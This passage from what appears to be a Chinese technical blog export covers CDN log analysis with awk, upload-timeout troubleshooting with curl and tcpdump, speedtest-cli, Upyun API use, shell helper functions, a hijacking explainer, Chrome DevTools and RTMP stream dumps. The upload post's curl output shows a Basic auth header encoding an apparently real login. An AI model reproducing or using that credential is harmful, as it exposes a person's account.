$body_bytes_sent &quot;$http_referer&quot; &quot;$http_user_agent&quot; $content_type $request_content_length $cache_hit $source_code $is_dynamic $cache_control $request_time $edge_server_ip 过滤日志通常过滤日志可以使用 awk sed grep 进行处理 比如说我们希望看看哪个 IP 访问的最多，判断下和又拍云后台统计的 IP 对不对得上，可以按照如下步骤操作 1.过滤日志的第一列，对 IP 进行排序统计 ➜ Downloads cat awen | awk &apos;{print $1}&apos; | sort| uniq -c |sort -r 132 60.186.217.92 108 115.231.100.106 26 112.17.241.128 20 116.237.32.67 14 14.24.209.40 14 115.192.21.157 14 112.17.245.42 14 101.226.79.182 12 49.5.0.66 11 153.37.114.107 8 36.23.228.97 7 36.35.35.97 7 202.189.0.2 7 125.121.41.81 7 124.160.213.58 7 117.136.0.254 7 115.206.56.50 7 115.193.173.10 7 112.26.238.72 7 112.10.109.202 7 100.64.126.174 6 61.151.226.202 3 66.249.66.11 3 223.155.233.4 2 90.44.59.57 2 171.8.70.8 1 66.249.66.15 1 42.156.138.103 1 35.187.149.136 1 220.181.108.95 1 220.181.108.178 1 220.181.108.154 1 220.181.108.112 1 202.200.151.142 1 182.138.102.194 1 119.62.42.104 1 112.17.242.187得到如上的结果 cat awen | awk &apos;{print $1}&apos; | sort| uniq -c |sort -r这个命令的意思是先用 awk 打印$1，awk 默认按空格进行分割，$1表示第一列，然后获取到第一列后 进行排序在统计，uniq只能对相邻的行进行比较。所以要先排序。然后在sort -c 参数进行一次倒序排列得到如上的结果，可以看到60.186.217.92 在23号这天访问了132次。 132 60.186.217.92 108 115.231.100.106我们去后台查下，发现是对上了，就说明统计没有出现错误的。 其实如果日志量大的话，比如超过1G cat 会很耗内存，不如直接 awk 节省资源 awk &apos;{print $1}&apos; | sort| uniq -c |sort -r awen那么如何统计流量呢?从日志看出，这个就稍微复杂点了，我们要对每个 IP 的流量进行统计，就是先要拿到 IP，然后在针对 IP 的请求字节进行统计计算，这里就要用到 awk 的循环和对列的相加了 ➜ Downloads cat awen| grep ^60.186.217.92| awk &apos;BEGIN{total=0}{total+=$10/1024/1024}END{print total}&apos; 8.90929上面是针对 60.186.217.92 的这个IP 进行统计，对比下后台，计算结果也是没有错的 如果要统计所有的流量 ➜ Downloads awk &apos;BEGIN{total=0}{total+=$10/1024/1024}END{print total}&apos; awen 29.2603发现一天的流量是20M，不过又拍云的计费是按地区和文件类型来计算的。比如国内和海外的计费价格是不一样的，动态和静态请求的计费也是不一样的。 其他的自行研究","categories":[],"tags":[{"name":"又拍云","slug":"又拍云","permalink":"https://awen.me/tags/%E5%8F%88%E6%8B%8D%E4%BA%91/"}]},{"title":"又拍云上传文件超时的排查思路","slug":"又拍云海外上传文件超时的排查思路","date":"2017-06-23T09:52:48.000Z","updated":"2021-02-26T06:05:29.320Z","comments":true,"path":"posts/1836873085.html","link":"","permalink":"https://awen.me/posts/1836873085.html","excerpt":"遇到海外节点上传超时，比如通过 api 接口上传报类似如下错误 RestClient::Exceptions::ReadTimeout: Timed out reading data from server首先，确认下代码里面的超时时间有没有设置，设置了多久，因为如果是海外上传的话，可能因为网络问题，导致超时也是有可能的，这个要具体分析。我们可以通过以下几个方面来判断","text":"遇到海外节点上传超时，比如通过 api 接口上传报类似如下错误 RestClient::Exceptions::ReadTimeout: Timed out reading data from server首先，确认下代码里面的超时时间有没有设置，设置了多久，因为如果是海外上传的话，可能因为网络问题，导致超时也是有可能的，这个要具体分析。我们可以通过以下几个方面来判断 ping这一步，我们得到又拍云 api 解析出来的节点 ip，发现 ping 值基本还是可以的，有11%的包出现了丢包，但是总体来看，每个包都有返回而不是 timeout root@ubuntu-1gb-sfo1-01:~# ping v0.api.upyun.com PING asia.b9.aicdn.com (43.230.89.190) 56(84) bytes of data. 64 bytes from 43.230.89.190: icmp_seq=1 ttl=49 time=155 ms 64 bytes from 43.230.89.190: icmp_seq=2 ttl=49 time=155 ms 64 bytes from 43.230.89.190: icmp_seq=3 ttl=49 time=155 ms 64 bytes from 43.230.89.190: icmp_seq=4 ttl=49 time=156 ms 64 bytes from 43.230.89.190: icmp_seq=5 ttl=49 time=155 ms 64 bytes from 43.230.89.190: icmp_seq=6 ttl=49 time=155 ms 64 bytes from 43.230.89.190: icmp_seq=7 ttl=49 time=155 ms 64 bytes from 43.230.89.190: icmp_seq=8 ttl=49 time=155 ms ^C --- asia.b9.aicdn.com ping statistics --- 9 packets transmitted, 8 received, 11% packet loss, time 10912ms rtt min/avg/max/mdev = 155.527/155.717/156.104/0.385 ms判断中间链路是否正常可以借助 mtr 来进行测试 ubuntu 系统 sudo apt-get install mtrcentos 系统 yum -y install mtr然后运行 root@ubuntu-1gb-sfo1-01:~# mtr v0.api.upyun.com查看结果，多执行几分钟看看 Loss%这一列有没有对应的 IP 或域名出现大量的丢包现象 测试网络上下行速度可以参考这篇文章:https://awen.me/post/1141940955.html 测试节点上传是否正常root@ubuntu-1gb-sfo1-01:~# curl -T speedtest.py -X PUT -H Host:v0.api.upyun.com http://43.230.89.166/bucket/ss.py -u fang:123456-v * Trying 43.230.89.166... * Connected to 43.230.89.166 (43.230.89.166) port 80 (#0) * Server auth using Basic with user &apos;fangwenjun&apos; &gt; PUT /file201503/ss.py HTTP/1.1 &gt; Host:v0.api.upyun.com &gt; Authorization: Basic ZmFuZ3dlbmp1bjpmd2pAOTAxMjAzQUFxcQ== &gt; User-Agent: curl/7.47.0 &gt; Accept: */* &gt; Content-Length: 47228 &gt; Expect: 100-continue &gt; &lt; HTTP/1.1 100 Continue * We are completely uploaded and fine &lt; HTTP/1.1 200 OK &lt; Server: marco/1.4 &lt; Content-Type: application/octet-stream &lt; Transfer-Encoding: chunked &lt; Connection: keep-alive &lt; X-Request-Id: e6bbc1a2edc448c265b4d7f80efd3753 &lt; X-Request-Path: api-php-082 &lt; Date: Fri, 23 Jun 2017 10:01:08 GMT &lt; Access-Control-Allow-Origin: * &lt; * Connection #0 to host 43.230.89.166 left intact返回的状态是200 就表示上传成功了 命令格式 curl -T 本地文件 -X PUT -H Host:v0.api.upyun.com http://节点IP/bucket/ 上传后的报错的文件名 -u 操作员:密码 -v 节点IP 就是你 ping v0.api.upyun.com 得到的 ip。如果上传成功说明没有问题，如果失败继续往下看 在执行上一步操作之前，在开一个ssh 连接到服务器，执行如下命令 tcpdump -i eth0 tcp port 80 得到如下结果，这样如果你看不懂，继续往下看 root@ubuntu-1gb-sfo1-01:~# tcpdump -i eth0 tcp port 80 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes 18:05:29.845227 IP 162.243.153.238.57874 &gt; 43.230.89.166.http: Flags [S], seq 526911320, win 29200, options [mss 1460,sackOK,TS val 6202003 ecr 0,nop,wscale 7], length 0 18:05:30.007885 IP 43.230.89.166.http &gt; 162.243.153.238.57874: Flags [S.], seq 3212301003, ack 526911321, win 28960, options [mss 1460,sackOK,TS val 1082030422 ecr 6202003,nop,wscale 10], length 0 18:05:30.007999 IP 162.243.153.238.57874 &gt; 43.230.89.166.http: Flags [.], ack 1, win 229, options [nop,nop,TS val 6202043 ecr 1082030422], length 0 18:05:30.008518 IP 162.243.153.238.57874 &gt; 43.230.89.166.http: Flags [P.], seq 1:200, ack 1, win 229, options [nop,nop,TS val 6202043 ecr 1082030422], length 199: HTTP: PUT /file201503/ss.py HTTP/1.1 18:05:30.171946 IP 43.230.89.166.http &gt; 162.243.153.238.57874: Flags [.], ack 200, win 30, options [nop,nop,TS val 1082030472 ecr 6202043], length 0 18:05:30.172174 IP 43.230.89.166.http &gt; 162.243.153.238.57874: Flags [P.], seq 1:26, ack 200, win 30, options [nop,nop,TS val 1082030472 ecr 6202043], length 25: HTTP: HTTP/1.1 100 Continue 18:05:30.172200 IP 162.243.153.238.57874 &gt; 43.230.89.166.http: Flags [.], ack 26, win 229, options [nop,nop,TS val 6202084 ecr 1082030472], length 0先执行 tcpdump -i eth0 tcp port 80 -w package.pcap然后执行上传命令得到如下结果 root@ubuntu-1gb-sfo1-01:~# tcpdump -i eth0 tcp port 80 -w package.pcap tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes ^C47 packets captured 47 packets received by filter 0 packets dropped by kernel root@ubuntu-1gb-sfo1-01:~#然后查看目录下有一个 package.pcap的文件，用 scp 工具或者你可以使用的工具把这个文件下载到本地 root@ubuntu-1gb-sfo1-01:~# ls package.pcap speedtest.py root@ubuntu-1gb-sfo1-01:~#提供一下工具 Windows： winscpWindows/linux/mac:filezilla 以 filezilla 为例 主机填写:sftp://ip 用户名 密码 端口进行连接 提供以上收集的信息反馈给又拍云进行排查，据说速度相当快。 本教程不仅仅适用于海外节点。注意一定要把信息给全，不然只是发一个报错没人知道怎么排查。","categories":[],"tags":[{"name":"又拍云","slug":"又拍云","permalink":"https://awen.me/tags/%E5%8F%88%E6%8B%8D%E4%BA%91/"}]},{"title":"如何测试服务器的上传和下载速度","slug":"如何测试服务器的上传和下载速度","date":"2017-06-23T09:27:07.000Z","updated":"2021-02-26T06:05:29.328Z","comments":true,"path":"posts/1141940955.html","link":"","permalink":"https://awen.me/posts/1141940955.html","excerpt":"图形化界面的 Windows 下我们可通过各种工具测试网速，手机端也可以，那么字符界面的 linux 服务如何测试呢？下面就讲一下speedtest-cli的使用","text":"图形化界面的 Windows 下我们可通过各种工具测试网速，手机端也可以，那么字符界面的 linux 服务如何测试呢？下面就讲一下speedtest-cli的使用 下载地址 GitHub 地址 安装#apt install python-pip #pip install --upgrade pip #pip install speedtest-cli使用root@ubuntu-1gb-sfo1-01:~# speedtest-cli Retrieving speedtest.net configuration... Testing from DigitalOcean (162.243.153.238)... Retrieving speedtest.net server list... Selecting best server based on ping... Hosted by Unwired (San Francisco, CA) [5.93 km]: 2.474 ms Testing download speed................................................................................ Download: 795.83 Mbit/s Testing upload speed................................................................................................ Upload: 875.41 Mbit/s可以看到 上传速度 875.41 Mbit/s 下载速度 795.83 Mbit/s 1.选择最近的节点测试 使用 speedtest-cli --list查看节点 [root@aliyun fangwenjun]# speedtest-cli --list | more Retrieving speedtest.net configuration... 4647) China Mobile Group Zhejiang Co.,Ltd (Hangzhou, China) [4.87 km] 5300) Hangzhou , Zhejiang Unicom (Hangzhou, China) [4.87 km] 7509) China Telecom ZheJiang Branch (Hangzhou, China) [4.87 km] 6245) ningbo unicom (Ningbo, China) [141.79 km] 6715) China Mobile Group Zhejiang Co., Ltd. (Ningbo, China) [141.79 km] 4665) China Mobile Group Shanghai Co.,LTD (Shanghai, China) [162.85 km] 3633) China Telecom (Shanghai, China) [162.85 km] 5083) Shanghai Branch, China Unicom (Shanghai, China) [162.85 km] 13704) China Unicom (Nanjing, China) [235.45 km] 5446) CHINA UNICOM JIANGSU COMPANY (Nanjing, China) [236.11 km] 5316) China Telecom JiangSu Branch (Nanjing, China) [236.11 km] 4377) China Mobile Group Anhui Co.,Ltd (Hefei, China) [325.13 km] 5724) ChinaUnicom (Hefei, China) [325.13 km] 7230) China Unicom.JiangXi Co.,Ltd (Nanchang, China) [451.09 km] 5097) Chinaunicom.jx (Nanchang, China) [451.09 km] 4884) China Unicom FuJian (Fuzhou, China) [476.39 km] 5396) China Telecom JiangSu Branch (Suzhou, China) [521.00 km] 5485) China Unicom,Hubei Branch (Wuhan, China) [564.39 km] 4938) Chief Telecom (Taoyuan, Taiwan) [589.47 km] 3921) Taiwan Fixed Network (Taoyuan, Taiwan) [589.47 km] 12582) TFN Media (Taoyuan, Taiwan) [589.47 km] 12595) Kbro (Taoyuan, Taiwan) [589.47 km] 然后使用指定节点测试 speedtest-cli --server [id]例如： # speedtest-cli --server 7509 Retrieving speedtest.net configuration... Testing from Aliyun Computing Co. (47.104.27.197)... Retrieving speedtest.net server list... Selecting best server based on ping... Hosted by China Telecom ZheJiang Branch (Hangzhou) [4.87 km]: 23.293 ms Testing download speed................................................................................ Download: 300.62 Mbit/s Testing upload speed................................................................................................ Upload: 11.81 Mbit/s","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"又拍云代理接口使用简明教程","slug":"又拍云代理接口使用简明教程","date":"2017-06-23T08:41:26.000Z","updated":"2021-02-26T06:05:29.319Z","comments":true,"path":"posts/3559683423.html","link":"","permalink":"https://awen.me/posts/3559683423.html","excerpt":"这里主要是简单介绍下如何使用又拍云的接口，这里只是简单说下使用方法。 在看这个教程前，你应当是已经拿到了又拍云提供的账号级的 token 以及 api 文档","text":"这里主要是简单介绍下如何使用又拍云的接口，这里只是简单说下使用方法。 在看这个教程前，你应当是已经拿到了又拍云提供的账号级的 token 以及 api 文档 那么我这里以 postman 来进行演示，首先，你需要对某个接口做什么操作，应当先读一遍接口的文档和熟悉相关参数。 此外，你可以去后台打开控制台，创建与接口相对于的功能，看下调用的接口和传的数据是什么，这样更方便你熟悉接口的参数是如何传的。打个比方，我现在要创建一个又拍云源模式的直播服务。 可以先打开控制台，并且打开开发者模式，切换到network，观察你每做一步所发起的请求中的 payload里的数据是什么。 那么我们创建一个直播服务，我们看下需要填写一些参数，把这些参数传入后点击创建，客户端会向API 接口发起请求，这个时候你看下都发了哪些数据就可以了。 那么我们可以看到，客户端先调用api/buckets接口创建一个直播类型的服务 数据如下 { &quot;bucket_name&quot;: &quot;testzb2019&quot;, &quot;type&quot;: &quot;ucdn&quot;, &quot;business_type&quot;: &quot;live&quot; }当创建完服务后，调用了 srs 接口 我们可以在 requests payload中查看 数据如下 { &quot;bucket_name&quot;: &quot;testzb2019&quot;, &quot;transport&quot;: &quot;push&quot;, &quot;domains&quot;: [ { &quot;domain&quot;: &quot;play.zb2.v5linux.com&quot;, &quot;type&quot;: &quot;down&quot; }, { &quot;domain&quot;: &quot;push.zb2.v5linux.com&quot;, &quot;type&quot;: &quot;up&quot; } ] }那么你直接复制过去改下就可以了，另外要注意的就是 api 接口不要填错，并且数据格式是要json 格式的 通常来说，你的请求头中需要包含 Content-Type:application/json Authorization: Bearer token 创建成功会返回 true，失败会有详细的错误信息返回，比如我没有调用buckets 接口创建直播类型的服务而是直接调用了 srs 接口创建直播服务 会提示我需要先创建一个直播类型的服务 { &quot;type&quot;: &quot;BucketNotFound&quot;, &quot;error_code&quot;: &quot;21905&quot;, &quot;request&quot;: &quot;PUT /srs&quot;, &quot;field&quot;: &quot;undefined&quot;, &quot;message&quot;: &quot;please create live type bucket first&quot; }","categories":[],"tags":[{"name":"又拍云","slug":"又拍云","permalink":"https://awen.me/tags/%E5%8F%88%E6%8B%8D%E4%BA%91/"}]},{"title":"自定义shell函数提升工作效率","slug":"自定义shell函数提升工作效率","date":"2017-06-23T00:20:42.000Z","updated":"2021-02-26T06:05:29.354Z","comments":true,"path":"posts/2999576879.html","link":"","permalink":"https://awen.me/posts/2999576879.html","excerpt":"平时经常需要进行 DNS 查询，比如查询某个域名的解析是否是在我们这边，但是客户往往丢过来的都是以http://开头的连接，而我使用 dig 查询的时候 是不可以直接加这样进行查询的","text":"平时经常需要进行 DNS 查询，比如查询某个域名的解析是否是在我们这边，但是客户往往丢过来的都是以http://开头的连接，而我使用 dig 查询的时候 是不可以直接加这样进行查询的 正常的查询 ➜ wwwroot dig www.baidu.com ; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; www.baidu.com ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 50637 ;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;www.baidu.com. IN A ;; ANSWER SECTION: www.baidu.com. 295 IN CNAME www.a.shifen.com. www.a.shifen.com. 295 IN A 180.97.33.107 www.a.shifen.com. 295 IN A 180.97.33.108 ;; Query time: 75 msec ;; SERVER: 223.5.5.5#53(223.5.5.5) ;; WHEN: Fri Jun 23 08:23:16 2017 ;; MSG SIZE rcvd: 90那么我们可以通过自定义shell 函数的方式来进行一些优化 jx () { echo $1 | awk -F&apos;[/:]&apos; &apos;{print $4}&apos; | xargs dig }将上面的内容放在你的家目录的.zshrc中，因为我用的是 zsh，如过你是 bash，就是 bashrc。然后添加后记得让它立即生效 $source ~/.zshrc然后就可以通过jx http://xxxxx.com去进行解析了 ➜ wwwroot jx http://awen.me ; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; awen.me ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 13337 ;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;awen.me. IN A ;; ANSWER SECTION: awen.me. 125 IN CNAME awenblog.b0.aicdn.com. awenblog.b0.aicdn.com. 125 IN CNAME nm.ctn.aicdn.com. nm.ctn.aicdn.com. 125 IN A 58.222.18.24 ;; Query time: 71 msec ;; SERVER: 223.5.5.5#53(223.5.5.5) ;; WHEN: Fri Jun 23 08:26:24 2017 ;; MSG SIZE rcvd: 97将base64字符串解码de () { echo &quot;$1&quot; | base64 -D; }将字符串编码成 base64en () { echo -n &quot;$1&quot; | base64; }获取 ip 归属地需要安装 httpie ip () { http http://freeapi.ipip.net/$1 }测试端口是否是通的p () { nc -zv $1 $2 }10 进制时间转成可读时间d () { date -r $1 }16 进制转成 10 进制10j () { echo $((0x$1)) }解析带 http 开头的 urljx () { echo $1 | awk -F&apos;[/:]&apos; &apos;{print $4}&apos; | xargs dig }MD5 字符串m5 () { md5 -s $1 }生成 hmac sha1 加密算法sha1 (){ echo -n $1 | openssl sha1 -hmac $2 }查询网址备案ba (){ curl -X GET http://www.sojson.com/api/beian/$1 }","categories":[],"tags":[{"name":"shell","slug":"shell","permalink":"https://awen.me/tags/shell/"}]},{"title":"聊一聊劫持","slug":"聊一聊劫持","date":"2017-06-22T13:52:30.000Z","updated":"2021-02-26T06:05:29.353Z","comments":true,"path":"posts/1832844835.html","link":"","permalink":"https://awen.me/posts/1832844835.html","excerpt":"为什么会写这篇文章一个真实的事情促使我写点什么，我正在刷朋友圈，发现一首歌，朋友从网易云音乐分享到朋友圈的，然后我就点进去了，发现在网易云音乐右下角有一个广告。是个中医的广告，而在进入朋友圈之前我用知乎看了了最近特别火的一个虚假宣传中医的老太婆的新闻","text":"为什么会写这篇文章一个真实的事情促使我写点什么，我正在刷朋友圈，发现一首歌，朋友从网易云音乐分享到朋友圈的，然后我就点进去了，发现在网易云音乐右下角有一个广告。是个中医的广告，而在进入朋友圈之前我用知乎看了了最近特别火的一个虚假宣传中医的老太婆的新闻 知乎标题 点了下劫持的内容，因为没有开电脑，否则就抓包了 搜索微信，可以肯定是一个卖狗皮膏药的家伙 所以，我毫不客气的点了举报按钮。 什么是劫持通俗的讲，就是当你浏览一个网页的时候，网页提供商返回给你的信息已经在数据传输到你浏览器显示的时候已经被篡改了。常见的劫持有 DNS 劫持（域名劫持）、会话劫持、浏览器劫持。 DNS 劫持指的是在一定的网络范围内劫持域名解析请求，比如你访问 www.baidu.com 结果得到的结果是www.av.com的内容。对于这种劫持的方法是，尽量避免使用默认运营商自带的 DNS，使用公共的 DNS，比如119.29.29.29、114.114.114.114。这种攻击一般还会被用在钓鱼网站，就是比如你访问一个银行的网站，但是实际这个银行的域名已经被黑客劫持到另外一台服务器上去了，返回给你的页面内容和真的银行内容一模一样，可以输入银行卡、账号，但是你输入了，你的钱也就没了。 会话劫持，常见的有中间人攻击。这种攻击是利用 tcp 通信原理。它可以攻击任何 tcp 协议的应用发起攻击，比如 HTTP FTP TELNET 等等。这些应用都是以明文进行传输的，非常不安全，黑客会在数据传输的中间比如路由器劫持你的报文，将报文内容进行修改，最后你收到的内容就是已经被篡改的内容了。 浏览器劫持，通常一些恶意软件会劫持浏览器，这个一般安装盗版的 Windows 用户会出现，比如你安装完后修改默认主页始终无法安装正常的程序修改，因为已经被恶意劫持了，比如你发现打开浏览器就是2345.com 的网址导航，但是你明明修改了默认主页，可是下次打开还是原来的2345导航。 解决劫持1.修改本地电脑或出口网关或路由器的 DNS，一般设置为公共的 DNS，因为公共的 DNS，比如 谷歌 8.8.8.8 114 114.114.114.114 这类DNS不容易被劫持（并不是说不会），但是总体来说比默认分配你 ISP 账号的运营商给的 DNS 被劫持的概率要小很多。 2.现在大部分网站都开启了 HTTPS，如果你是网站的维护者或者管理员，也建议上 HTTPS 才是王道。","categories":[],"tags":[{"name":"劫持","slug":"劫持","permalink":"https://awen.me/tags/%E5%8A%AB%E6%8C%81/"}]},{"title":"chrome 开发者工具的使用","slug":"chrome-开发者工具的使用","date":"2017-06-22T09:20:33.000Z","updated":"2021-02-26T06:05:29.272Z","comments":true,"path":"posts/2452894659.html","link":"","permalink":"https://awen.me/posts/2452894659.html","excerpt":"chrome 开发者工具可以非常好的帮助我们分析和处理 web 请求中遇到的各种问题，当然像 ie 火狐等都有。在实际的工作过程中使用 chrome 较多，所以这里着重下下 chrome 的使用，其他类似","text":"chrome 开发者工具可以非常好的帮助我们分析和处理 web 请求中遇到的各种问题，当然像 ie 火狐等都有。在实际的工作过程中使用 chrome 较多，所以这里着重下下 chrome 的使用，其他类似 打开开发者工具1.选择地址栏后面的三个点按钮 —更多工具—开发者工具，或者按快捷键，Windows 和 mac 还是有区别的 Windows 是 ctrl+Y mac 是 option+command+I或者右键点击检查打开 打开之后会显示这样的对话框，注意后边，默认可能这个框是在侧边的，我们可以去调整，我是喜欢在下面 查看源码1.点击Elements 选项，可以查看当前网页的源码，右侧是显示样式表和盒模型等 在右侧可以选择设置，在弹出的页面选择要显示的功能 具体的可以自行研究，包括快捷键 回调当前设置的主页面，再次选择找到 show console drawer 在这个页面，我们可以设置 user-agent 在user-agent 中设置 切换到移动端模式1.点击 elements 旁边的图标，可以预览移动端下的页面布局，可以选择在那种舍不下显示以及定义尺寸 是否横屏 ##console console 选项用来显示当前页面的一些调试或错误信息 输入 js 语句 过滤器后面可以选择日志级别 sourcesource 下可以查看当前页面的所有元素，js、css 以及外部链接的加载内容 network这个功能最重要，一般网络出现问题，页面元素无法加载，我们都可以在这里看到 当前发现如上图所示，一片空白，是因为你是在页面已经加载完毕后打开了控制台，需要刷新下，一般我喜欢俺 command+shift+r强制刷新，可以拖拽时间轴上的滚动条浏览指定时间加载的元素内容。 另外，如果希望查看指定类型的文件，比如图片，可以在时间轴上方的菜单栏中进行过滤，如果只希望看图片的，可以选择 Img。也可以按文件名过滤，在 filter 中输入名称过滤 红色部分的按钮可以调整或隐藏时间轴和显示文件列表的模式 在底层会显示当前页面加载了多少个元素以及总共耗时，默认是 ms，如果是s，则表示页面加载时间整理过长，可以针对性的看下究竟是哪个元素耗时过长 可以对 time 进行排序查看，另外如果是文件访问404，可以通过状态查看 另外在该选项中还可以模拟页面的网络环境，选择对应的网络环境进行测试页面加载 在 No throtting 户名的三角按钮选择 disable cache 可以禁止浏览器缓存 查看证书1.切换到 security 可以查看当前证书加载的相关内容 点击 view certificate 查看证书信息 好了，目前就讲到这里，chrome还有很多特别高级的设置没有提到。期待你的发现。","categories":[],"tags":[{"name":"chrome","slug":"chrome","permalink":"https://awen.me/tags/chrome/"}]},{"title":" 如何申请又拍云联盟","slug":"如何申请又拍云联盟","date":"2017-06-22T08:54:54.000Z","updated":"2021-02-26T06:05:29.329Z","comments":true,"path":"posts/172153036.html","link":"","permalink":"https://awen.me/posts/172153036.html","excerpt":"注册账号又拍云联盟的申请，首先需要注册账号 提交申请1.打开官网，点击最新活动 选择又拍云联盟","text":"注册账号又拍云联盟的申请，首先需要注册账号 提交申请1.打开官网，点击最新活动 选择又拍云联盟 2.然后按照步骤走，注册账号后点击获取 logo，将其放置在你网站的底部 例如 然后提交申请点击官网的立即申请确认信息无误后提交 注意：提交申请后，会在下一个周四发放代金券 登陆后台后，可以看到代金券 代金券会标注为 lianmeng-后面跟上发放日期 然后就可以使用了，如果是第一次使用，可以看下这里的视频教程","categories":[],"tags":[{"name":"又拍云","slug":"又拍云","permalink":"https://awen.me/tags/%E5%8F%88%E6%8B%8D%E4%BA%91/"}]},{"title":"如何判断直播流的时间戳是否正常","slug":"如何判断直播流的时间戳是否正常","date":"2017-06-22T08:35:22.000Z","updated":"2021-02-26T06:05:29.325Z","comments":true,"path":"posts/3384601802.html","link":"","permalink":"https://awen.me/posts/3384601802.html","excerpt":"在拉流过程中，我们会发现卡顿，无法显示，黑屏等原因，这个时候，我们希望看下流的原始信息，比如码率、帧率等信息，我们可以通过 rtmp_dump来进行查看 $srs_rtmp_dump -r rtmp://test.b0.v5linux.com/live/lol &gt;&gt; srslog","text":"在拉流过程中，我们会发现卡顿，无法显示，黑屏等原因，这个时候，我们希望看下流的原始信息，比如码率、帧率等信息，我们可以通过 rtmp_dump来进行查看 $srs_rtmp_dump -r rtmp://test.b0.v5linux.com/live/lol &gt;&gt; srslog 查看文本信息 dump rtmp stream to flv file srs(ossrs) client librtmp library. version: 4.0.184, signature: SRDUMP/4.0.184 @refer to http://rtmpdump.mplayerhq.hu/rtmpdump.1.html [2017-06-22 16:37:42.41][2742] rtmp url: rtmp://test.b0.v5linux.com/live/lol [2017-06-22 16:37:42.41][2742] handshake: simple [2017-06-22 16:37:42.41][2742] swfUrl: (null) [2017-06-22 16:37:42.41][2742] pageUrl: (null) [2017-06-22 16:37:42.41][2742] tcUrl: (null) [2017-06-22 16:37:42.41][2742] timeout: 5000 [2017-06-22 16:37:42.41][2742] output to console [2017-06-22 16:37:42.41][2742] start rtmp dump. [2017-06-22 16:37:42.41][2742] dns resolve ok, dns=0ms/0ms [2017-06-22 16:37:42.42][2742] tcp connect ok, tcp=7ms/7ms [2017-06-22 16:37:42.43][2742] do simple handshake success [2017-06-22 16:37:42.49][2742] connect ok, ip=150.138.216.166, server=UPYUN/4.0.187(BMS)/4.0.187, pid=3493337, cid=11560 [2017-06-22 16:37:42.50][2742] play stream success, play=84ms/91ms [2017-06-22 16:37:42.51][2742] Rtmp packet id=0/0.0/0.0, type=0x14, dts=0, pts=0, ndiff=0, size=21 [2017-06-22 16:37:42.53][2742] Rtmp packet id=1/0.0/0.0, type=0x4, dts=0, pts=0, ndiff=24, size=6 [2017-06-22 16:37:42.58][2742] Rtmp packet id=2/0.0/0.0, type=0x14, dts=0, pts=0, ndiff=71, size=154 [2017-06-22 16:37:42.58][2742] Rtmp packet id=3/0.0/0.0, type=0x14, dts=0, pts=0, ndiff=71, size=148 [2017-06-22 16:37:42.58][2742] Data packet id=4/0.0/0.0, type=Data, time=0, ndiff=71, diff=0, size=24 String |RtmpSampleAccess Boolean true Boolean true [2017-06-22 16:37:42.58][2742] Data packet id=5/14.2/70.4, type=Data, time=0, ndiff=0, diff=0, size=44 String onStatus Object (1 items) Property &apos;code&apos; String NetStream.Data.Start [2017-06-22 16:37:42.90][2742] Data packet id=6/11.8/84.5, type=Data, time=0, ndiff=324, diff=0, size=24 String |RtmpSampleAccess Boolean true Boolean true [2017-06-22 16:37:42.90][2742] Data packet id=7/56.4/17.7, type=Data, time=0, ndiff=0, diff=0, size=44 String onStatus Object (1 items) Property &apos;code&apos; String NetStream.Data.Start [2017-06-22 16:37:43.32][2742] Data packet id=8/49.4/20.3, type=Data, time=0, ndiff=416, diff=0, size=24 String |RtmpSampleAccess Boolean true Boolean true [2017-06-22 16:37:43.32][2742] Data packet id=9/90.1/11.1, type=Data, time=0, ndiff=0, diff=0, size=44 String onStatus Object (1 items) Property &apos;code&apos; String NetStream.Data.Start [2017-06-22 16:37:43.32][2742] Data packet id=10/81.1/12.3, type=Data, time=0, ndiff=0, diff=0, size=24 String |RtmpSampleAccess Boolean true Boolean true [2017-06-22 16:37:43.32][2742] Data packet id=11/73.7/13.6, type=Data, time=0, ndiff=1, diff=0, size=44 String onStatus Object (1 items) Property &apos;code&apos; String NetStream.Data.Start [2017-06-22 16:37:43.32][2742] Data packet id=12/67.7/14.8, type=Data, time=0, ndiff=0, diff=0, size=24 String |RtmpSampleAccess Boolean true Boolean true [2017-06-22 16:37:43.32][2742] Data packet id=13/62.5/16.0, type=Data, time=0, ndiff=0, diff=0, size=44 String onStatus Object (1 items) Property &apos;code&apos; String NetStream.Data.Start [2017-06-22 16:37:43.32][2742] Video packet id=14/58.0/17.2, type=Video, dts=7, pts=7, ndiff=0, diff=0/0, size=55, H.264(SH,I) [2017-06-22 16:37:43.32][2742] got the first audio/video, type=9, first=819ms/910ms, conn=903ms [2017-06-22 16:37:43.32][2742] Audio packet id=15/54.1/18.5, type=Audio, dts=7, pts=7, ndiff=0, diff=0/0, size=4, AAC(44KHz,16bit,Stereo,SH) [2017-06-22 16:37:43.32][2742] Video packet id=16/50.8/19.7, type=Video, dts=17, pts=17, ndiff=0, diff=10/10, size=369, H.264(Nalu,P/B) [2017-06-22 16:37:43.32][2742] Audio packet id=17/47.8/20.9, type=Audio, dts=30, pts=30, ndiff=0, diff=13/23, size=481, AAC(44KHz,16bit,Stereo,Raw) [2017-06-22 16:37:43.32][2742] Video packet id=18/45.1/22.2, type=Video, dts=50, pts=116, ndiff=0, diff=20/33, size=593, H.264(Nalu,P/B) [2017-06-22 16:37:43.32][2742] Audio packet id=19/42.7/23.4, type=Audio, dts=53, pts=53, ndiff=0, diff=3/23, size=436, AAC(44KHz,16bit,Stereo,Raw) [2017-06-22 16:37:43.32][2742] Audio packet id=20/40.6/24.6, type=Audio, dts=77, pts=77, ndiff=0, diff=24/24, size=476, AAC(44KHz,16bit,Stereo,Raw) [2017-06-22 16:37:43.32][2742] Video packet id=21/38.7/25.9, type=Video, dts=84, pts=84, ndiff=0, diff=7/34, size=369, H.264(Nalu,P/B) [2017-06-22 16:37:43.32][2742] Audio packet id=22/36.9/27.1, type=Audio, dts=100, 